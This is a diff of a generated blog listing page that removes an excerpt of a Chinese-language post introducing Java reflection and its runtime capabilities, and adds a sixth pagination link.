-        <p>详见:<a href="https://www.sczyh30.com/posts/Java/java-reflection-1/" target="_blank" rel="noopener">https://www.sczyh30.com/posts/Java/java-reflection-1/</a><br><br><a href="https://blog.csdn.net/ljphhj/article/details/12858767" target="_blank" rel="noopener">https://blog.csdn.net/ljphhj/article/details/12858767</a></p>
-<h4 id="1-什么是反射"><a href="#1-什么是反射" class="headerlink" title="1.什么是反射"></a>1.什么是反射</h4><blockquote>
-<p>Reflection enables Java code to discover information about the fields, methods and constructors of loaded classes, and to use reflected fields, methods, and constructors to operate on their underlying counterparts, within security restrictions.<br>The API accommodates applications that need access to either the public members of a target object (based on its runtime class) or the members declared by a given class. It also allows programs to suppress default reflective access control</p>
-</blockquote>
-<p>反射机制允许运行中的 Java 程序获取自身的信息，并且可以操作类或对象的内部属性。<br><br>反射的核心是 JVM 在运行时才动态加载类或调用方法/访问属性，它不需要事先（写代码的时候或编译期）知道运行对象是谁。<br><br>Java 反射主要提供以下功能：</p>
-<ul>
-<li>在运行时判断任意一个对象所属的类；</li>
-<li>在运行时构造任意一个类的对象；</li>
-<li>在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；</li>
-<li>在运行时调用任意一个对象的方法</li>
-</ul>
-<p><strong>在运行时，而不是编译时.</strong></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/11/07/java/reflect/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
     </nav>
   
 
